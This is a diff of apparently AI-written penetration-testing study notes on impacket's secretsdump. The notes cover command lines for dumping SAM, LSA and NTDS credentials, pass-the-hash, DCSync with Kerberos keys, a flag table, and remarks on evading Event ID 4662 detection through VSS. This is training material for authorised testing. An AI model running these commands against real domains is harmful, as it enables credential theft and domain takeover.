@@ -17,7 +17,8 @@ secretsdump.py -hashes :NTLMhash DOMAIN/user@<target-ip>
 
 > [!note] **secretsdump vs Mimikatz** — secretsdump runs entirely from your attack box over the network — no binary touches the target beyond what SMB/WMI normally does. Mimikatz requires execution on the target. Use secretsdump when you have valid creds/hash and want minimal footprint. Use Mimikatz when you need live LSASS (WDigest, Kerberos tickets, DPAPI).
 
-> [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] (DCSync with a recovered machine-account hash) and [[Services/Active Directory/Entra ID|Entra ID]] (DCSync with stolen MSOL/Azure AD Connect credentials).
+> [!note] **See also** — [[Tools/Credential Dumping/pypykatz|pypykatz]] (offline LSASS/registry parser — the tool secretsdump complements for the *dump-file* half); [[Tools/Credential Dumping/mimikatz|mimikatz]] (on-host `lsadump::dcsync` equivalent when you'd rather run on the target); [[Tools/Lateral Movement/NetExec|NetExec]] (`--ntds` / `--sam` / `--lsa` wrap the same impacket routines for sweeps across many hosts).
+> [[Services/Active Directory/ADCS|ADCS]] (DCSync with a recovered machine-account hash) and [[Services/Active Directory/Entra ID|Entra ID]] (DCSync with stolen MSOL/Azure AD Connect credentials).
 > Also used in [[Class notes/HTB Academy/CPTS v2 (claude)/Password Attacks|Password Attacks]] (CPTS v2).
 
 ---
@@ -28,8 +29,9 @@ secretsdump.py -hashes :NTLMhash DOMAIN/user@<target-ip>
 # Full dump — SAM + LSA + cached + NTDS (if DC)
 secretsdump.py DOMAIN/Administrator:Password@192.168.1.10
 
-# Pass the Hash — NTLM auth
-secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee:NTLMhash DOMAIN/Administrator@192.168.1.10
+# Pass the Hash — NTLM auth. Format is LMHASH:NTHASH; use the empty-LM
+# placeholder for the LM half (or just ":<NThash>"). NOT three colon-fields.
+secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> DOMAIN/Administrator@192.168.1.10
 
 # SAM + LSA + cached are dumped by DEFAULT on a remote run (no flag needed); there is no
 # "-just-sam". Use -just-dc / -just-dc-user to RESTRICT to DCSync (NTDS) instead of broadening.
@@ -65,8 +67,12 @@ secretsdump.py -hashes :NTLMhash DOMAIN/Administrator@dc01.domain.local -just-dc
 # DCSync with Kerberos
 KRB5CCNAME=admin.ccache secretsdump.py -k -no-pass DOMAIN/Administrator@dc01.domain.local -just-dc
 
-# Include Kerberos keys (AES128/AES256) in addition to NTLM
-secretsdump.py DOMAIN/Administrator:Password@dc01.domain.local -just-dc -pwd-last-set -history
+# NOTE: -just-dc ALREADY dumps Kerberos keys (AES128/AES256/DES) alongside NTLM — no extra
+# flag needed. Use -just-dc-ntlm to RESTRICT to NTLM only (skips the Kerberos-keys section).
+secretsdump.py DOMAIN/Administrator:Password@dc01.domain.local -just-dc-ntlm
+
+# -history adds password history; -pwd-last-set annotates each account's pwdLastSet
+secretsdump.py DOMAIN/Administrator:Password@dc01.domain.local -just-dc -history -pwd-last-set
 ```
 
 **Output format:**
@@ -179,9 +185,13 @@ secretsdump.py DOMAIN/user:Password@dc01.domain.local -dc-ip 192.168.1.1
 
 | Flag | Description |
 |---|---|
-| `-just-dc` | DCSync only (NTDS hashes) |
-| `-just-dc-user <user>` | DCSync single user |
-| `-history` | Include password history |
+| `-just-dc` | DCSync only — NTDS NTLM hashes **+ Kerberos keys** |
+| `-just-dc-ntlm` | DCSync NTLM hashes **only** (skip Kerberos keys — faster/quieter) |
+| `-just-dc-user <user>` | DCSync single user (DRSUAPI only; implies `-just-dc`) |
+| `-use-vss` | Dump NTDS via the NTDSUTIL/VSS method instead of DRSUAPI (no 4662 replication event) |
+| `-exec-method <m>` | Remote exec method for `-use-vss`: `smbexec` (default), `wmiexec`, `mmcexec` |
+| `-resumefile <f>` | Resume/checkpoint a large NTDS DRSUAPI dump if interrupted |
+| `-history` | Include password history (NTDS + SAM), LSA secrets OldVal |
 | `-pwd-last-set` | Show password last set timestamp |
 | `-hashes LM:NT` | PTH authentication |
 | `-k` | Kerberos auth (use with KRB5CCNAME) |
@@ -198,9 +208,10 @@ secretsdump.py DOMAIN/user:Password@dc01.domain.local -dc-ip 192.168.1.1
 - DCSync generates Event ID **4662** on the DC (`DS-Replication-Get-Changes-All`) — heavily monitored in mature environments
 - Local hive parsing generates zero network noise — preferred if you already have the files
 - `secretsdump` with `-just-dc` is noisier than targeted `-just-dc-user` — use targeted if you only need specific accounts (e.g., `krbtgt`)
+- `-use-vss` avoids the DRSUAPI replication path (no 4662 `DS-Replication-Get-Changes-All`), but instead spawns `ntdsutil`/VSS via a remote exec method — trading one detection signature for process-creation + service telemetry, not eliminating it. Defenders monitor both.
 
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-27*
+*Updated: 2026-09-29*
 *Model: claude-opus-4-8*
